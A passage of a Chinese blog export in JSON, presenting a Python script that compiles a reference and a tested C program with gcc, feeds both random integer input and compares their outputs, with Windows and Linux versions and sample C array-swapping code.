}\n    p = *x;\n    *x = *d;\n    *d = p;\n    q = *(x + 9);\n    *(x + 9) = *c;\n    *c = q;\n}\n```\n\n### Linux 下的 Python 源码\n\n一个现象就是， Linux 下进行测试的速度明显比 Windows 下快，我测试的时候两者甚至相差 100 余倍，其中原因可留给读者细究。\n\n```python\nimport subprocess\nimport random\nimport sys\nfrom tqdm import tqdm\n\ndef random_int_list(start, stop, length):\n    start, stop = (int(start), int(stop)) if start <= stop else (\n        int(stop), int(start))\n    length = int(abs(length)) if length else 0\n    random_list = []\n    for i in range(length):\n        random_list.append(random.randint(start, stop))\n    return random_list\n\ndef iotest(filename, path, data):\n    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,\n                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=\"utf-8\")\n    obj.stdin.write(data)\n    out_info, out_error = obj.communicate()  # 简单写法，out_info：标准输出\n    # print(out_info,out_error)\n    return out_info\n\nif __name__ == '__main__':\n    stdpath = \"%s/标准代码/\" % sys.path[0]      # 标准代码所在路径\n    testpath = \"%s/测试代码/\" % sys.path[0]     # 测试代码所有路径\n    #编译标准及测试代码\n    result = subprocess.check_output(\"gcc -std=c99 -o std std.c\", shell=True, cwd=stdpath)\n    result = subprocess.check_output(\"gcc -std=c99 -o test test.c\", shell=True, cwd=testpath)\n\n    f = open('%s/测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=\"\")\n    print('随机测试中...')\n    pas=0       # 通过次数\n    freq=100    # 测试次数\n    for index in tqdm(range(freq)):\n        # 生成测试数据\n        rtest = random_int_list(0, 99, 10)\n        s = ''\n        for i in rtest:\n            s = \"%s%s \" % (s, i)\n        s = \"%s\\n\" % s\n        # 进行测试\n        output = iotest(\"./test\", testpath, s)\n        stdoutput = iotest(\"./std\", stdpath, s)\n        f.write(\"随机测试 - r,%d数据点\\n\"%index)\n        f.write(\"标准输入\\n%s\" % s)\n        f.write(\"实际输出\\n%s\\n\" % output)\n        f.write(\"期望输出\\n%s\\n\\n\" % stdoutput)\n        if output==stdoutput:\n            f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n            pas=pas+1\n        else:\n            f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index)\n    f.close()\n    print('随机测试 %d/%d'%(pas,freq))\n    print('测试完成')\n```\n","slug":"一个简单的本地判题脚本","published":1,"updated":"2022-11-08T09:32:50.439Z","_id":"cl8wgpppa0015ck6g74h7aqhq","comments":1,"layout":"post","photos":[],"content":"<p>在做程序设计作业的时候，题目经常是要输入 10 个数字，但用不起 Matrix 的我只能手动输入，不但麻烦，而且也很难模拟随机过程，想过做一个 OJ （在线判题平台），但又苦于不会用 Docker ，思来想去，就用 Python 写了个本地判题脚本，虽然还不能防恶意代码，也无法实现内存检查，但基本的输入输出还是能够做到，供君一乐。</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h2><h3 id=\"Windows下\"><a href=\"#Windows下\" class=\"headerlink\" title=\"Windows下\"></a>Windows下</h3><p>鉴于本人是追求实用（能跑就行），同理猜测读者也不关心这到底怎么实现，或者说不着急关心，于是直接附上 Windows 环境下的 Python 源码，开盒即用，只需要你有一点 Python 的基础，会装 subprocess 和 tqdm 库就行，然后在脚本所在的目录新建一个名为<code>标准代码</code>的文件夹，并在里面放入一个<code>std.c</code>作为测试输出的基准参照，同理新建一个<code>测试代码</code>的文件夹并放入<code>test.c</code>作为被测试的代码，<strong>同时安装好gcc</strong>，运行脚本，就能大功告成了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_int_list</span>(<span class=\"params\">start, stop, length</span>):</span><br><span class=\"line\">    start, stop = (<span class=\"built_in\">int</span>(start), <span class=\"built_in\">int</span>(stop)) <span class=\"keyword\">if</span> start &lt;= stop <span class=\"keyword\">else</span> (</span><br><span class=\"line\">        <span class=\"built_in\">int</span>(stop), <span class=\"built_in\">int</span>(start))</span><br><span class=\"line\">    length = <span class=\"built_in\">int</span>(<span class=\"built_in\">abs</span>(length)) <span class=\"keyword\">if</span> length <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    random_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        random_list.append(random.randint(start, stop))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> random_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">iotest</span>(<span class=\"params\">filename, path, data</span>):</span><br><span class=\"line\">    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,</span><br><span class=\"line\">                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=<span class=\"string\">&quot;utf-8&quot;</span>,shell=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    obj.stdin.write(data)</span><br><span class=\"line\">    out_info, out_error = obj.communicate()  <span class=\"comment\"># 简单写法，out_info：标准输出</span></span><br><span class=\"line\">    <span class=\"comment\"># print(out_info,out_error)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> out_info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    stdpath = <span class=\"string\">&quot;%s\\\\标准代码\\\\&quot;</span> % sys.path[<span class=\"number\">0</span>]      <span class=\"comment\"># 标准代码所在路径</span></span><br><span class=\"line\">    testpath = <span class=\"string\">&quot;%s\\\\测试代码\\\\&quot;</span> % sys.path[<span class=\"number\">0</span>]     <span class=\"comment\"># 测试代码所有路径</span></span><br><span class=\"line\">    <span class=\"comment\">#编译标准及测试代码</span></span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o std std.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=stdpath)</span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o test test.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=testpath)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s\\测试结果.txt&#x27;</span> % sys.path[<span class=\"number\">0</span>], <span class=\"string\">&#x27;w+&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>, newline=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试中...&#x27;</span>)</span><br><span class=\"line\">    pas=<span class=\"number\">0</span>       <span class=\"comment\"># 通过次数</span></span><br><span class=\"line\">    freq=<span class=\"number\">10</span>    <span class=\"comment\"># 测试次数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(freq)):</span><br><span class=\"line\">        <span class=\"comment\"># 生成测试数据</span></span><br><span class=\"line\">        rtest = random_int_list(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">        s = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rtest:</span><br><span class=\"line\">            s = <span class=\"string\">&quot;%s%s &quot;</span> % (s, i)</span><br><span class=\"line\">        s = <span class=\"string\">&quot;%s\\n&quot;</span> % s</span><br><span class=\"line\">        <span class=\"comment\"># 进行测试</span></span><br><span class=\"line\">        output = iotest(<span class=\"string\">&quot;.\\\\test.exe&quot;</span>, testpath, s)</span><br><span class=\"line\">        stdoutput = iotest(<span class=\"string\">&quot;.\\\\std.exe&quot;</span>, stdpath, s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;随机测试 - r,%d数据点\\n&quot;</span>%index)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;标准输入\\n%s&quot;</span> % s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;实际输出\\n%s\\n&quot;</span> % output)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;期望输出\\n%s\\n\\n&quot;</span> % stdoutput)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> output==stdoutput:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">            pas=pas+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;未通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试 %d/%d&#x27;</span>%(pas,freq))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;测试完成&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>同时附上样例标准代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 10</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">handlearray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">outputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> *p,<span class=\"type\">int</span> *q)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"built_in\">array</span>[N]= &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    inputarray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    handlearray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    outputarray(<span class=\"built_in\">array</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">int</span> *p,<span class=\"type\">int</span> *q)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> temp=*p;</span><br><span class=\"line\">    *p=*q;</span><br><span class=\"line\">    *q=temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">handlearray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"type\">int</span> max_index=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> min_index=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> max=arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> min=arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;N;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*(p+i)&gt;max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max=*(p+i);</span><br><span class=\"line\">            max_index=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*(p+i)&lt;min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            min=*(p+i);</span><br><span class=\"line\">            min_index=i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap((p+max_index),(p+<span class=\"number\">9</span>));</span><br><span class=\"line\">    swap((p+min_index),(p+<span class=\"number\">0</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;N; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,(p+i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">outputarray</span><span class=\"params\">(<span class=\"type\">int</span> *arr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *p=arr;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;N; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,*(p+i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以及样例测试代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">inv</span><span class=\"params\">(<span class=\"type\">int</span> *x, <span class=\"type\">int</span> n)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> i, a[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;\\n&quot;);</span></span><br><span class=\"line\">    inv(a, <span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;The array has been inverted:\\n&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>, a[i]);</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;\\n&quot;);</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">inv</span><span class=\"params\">(<span class=\"type\">int</span> *x, <span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> *i, max, min, p, q, *c, *d;</span><br><span class=\"line\">    max = *x;</span><br><span class=\"line\">    min = *(x + <span class=\"number\">1</span>);</span><br><span class=\"line\">    c = x + <span class=\"number\">0</span>;</span><br><span class=\"line\">    d = x + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = x; i &lt; x + <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*i &gt; max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max = *i;</span><br><span class=\"line\">            c = i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = x; i &lt; x + <span class=\"number\">10</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*i &lt; min)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            min = *i;</span><br><span class=\"line\">            d = i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    p = *x;</span><br><span class=\"line\">    *x = *d;</span><br><span class=\"line\">    *d = p;</span><br><span class=\"line\">    q = *(x + <span class=\"number\">9</span>);</span><br><span class=\"line\">    *(x + <span class=\"number\">9</span>) = *c;</span><br><span class=\"line\">    *c = q;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Linux-下的-Python-源码\"><a href=\"#Linux-下的-Python-源码\" class=\"headerlink\" title=\"Linux 下的 Python 源码\"></a>Linux 下的 Python 源码</h3><p>一个现象就是， Linux 下进行测试的速度明显比 Windows 下快，我测试的时候两者甚至相差 100 余倍，其中原因可留给读者细究。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_int_list</span>(<span class=\"params\">start, stop, length</span>):</span><br><span class=\"line\">    start, stop = (<span class=\"built_in\">int</span>(start), <span class=\"built_in\">int</span>(stop)) <span class=\"keyword\">if</span> start &lt;= stop <span class=\"keyword\">else</span> (</span><br><span class=\"line\">        <span class=\"built_in\">int</span>(stop), <span class=\"built_in\">int</span>(start))</span><br><span class=\"line\">    length = <span class=\"built_in\">int</span>(<span class=\"built_in\">abs</span>(length)) <span class=\"keyword\">if</span> length <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    random_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length):</span><br><span class=\"line\">        random_list.append(random.randint(start, stop))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> random_list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">iotest</span>(<span class=\"params\">filename, path, data</span>):</span><br><span class=\"line\">    obj = subprocess.Popen([filename], stdin=subprocess.PIPE,</span><br><span class=\"line\">                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    obj.stdin.write(data)</span><br><span class=\"line\">    out_info, out_error = obj.communicate()  <span class=\"comment\"># 简单写法，out_info：标准输出</span></span><br><span class=\"line\">    <span class=\"comment\"># print(out_info,out_error)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> out_info</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    stdpath = <span class=\"string\">&quot;%s/标准代码/&quot;</span> % sys.path[<span class=\"number\">0</span>]      <span class=\"comment\"># 标准代码所在路径</span></span><br><span class=\"line\">    testpath = <span class=\"string\">&quot;%s/测试代码/&quot;</span> % sys.path[<span class=\"number\">0</span>]     <span class=\"comment\"># 测试代码所有路径</span></span><br><span class=\"line\">    <span class=\"comment\">#编译标准及测试代码</span></span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o std std.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=stdpath)</span><br><span class=\"line\">    result = subprocess.check_output(<span class=\"string\">&quot;gcc -std=c99 -o test test.c&quot;</span>, shell=<span class=\"literal\">True</span>, cwd=testpath)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;%s/测试结果.txt&#x27;</span> % sys.path[<span class=\"number\">0</span>], <span class=\"string\">&#x27;w+&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>, newline=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试中...&#x27;</span>)</span><br><span class=\"line\">    pas=<span class=\"number\">0</span>       <span class=\"comment\"># 通过次数</span></span><br><span class=\"line\">    freq=<span class=\"number\">100</span>    <span class=\"comment\"># 测试次数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(freq)):</span><br><span class=\"line\">        <span class=\"comment\"># 生成测试数据</span></span><br><span class=\"line\">        rtest = random_int_list(<span class=\"number\">0</span>, <span class=\"number\">99</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">        s = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rtest:</span><br><span class=\"line\">            s = <span class=\"string\">&quot;%s%s &quot;</span> % (s, i)</span><br><span class=\"line\">        s = <span class=\"string\">&quot;%s\\n&quot;</span> % s</span><br><span class=\"line\">        <span class=\"comment\"># 进行测试</span></span><br><span class=\"line\">        output = iotest(<span class=\"string\">&quot;./test&quot;</span>, testpath, s)</span><br><span class=\"line\">        stdoutput = iotest(<span class=\"string\">&quot;./std&quot;</span>, stdpath, s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;随机测试 - r,%d数据点\\n&quot;</span>%index)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;标准输入\\n%s&quot;</span> % s)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;实际输出\\n%s\\n&quot;</span> % output)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;期望输出\\n%s\\n\\n&quot;</span> % stdoutput)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> output==stdoutput:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">            pas=pas+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            f.write(<span class=\"string\">&#x27;未通过「随机测试 - r,%d数据点」测试点\\n\\n&#x27;</span>%index)</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;随机测试 %d/%d&#x27;</span>%(pas,freq))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;测试完成&#x27;</span>)</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>在做程序设计作业的时候，题目经常是要输入 10 个数字，但用不起 Matrix 的我只能手动输入，不但麻烦，而且也很难模拟随机过程，想过做一个 OJ （在线判题平台），但又苦于不会用 Docker ，思来想去，就用 Python 写了个本地判题脚本，虽然还不能防恶意代码，也无法实现内存检查，但基本的输入输出还是能够做到，供君一乐。</p>","more":"<hr>\n<h2 id=\"源码\"><a href=\"#源码\" class=\"headerlink\" title=\"源码\"></a>源码</h2><h3 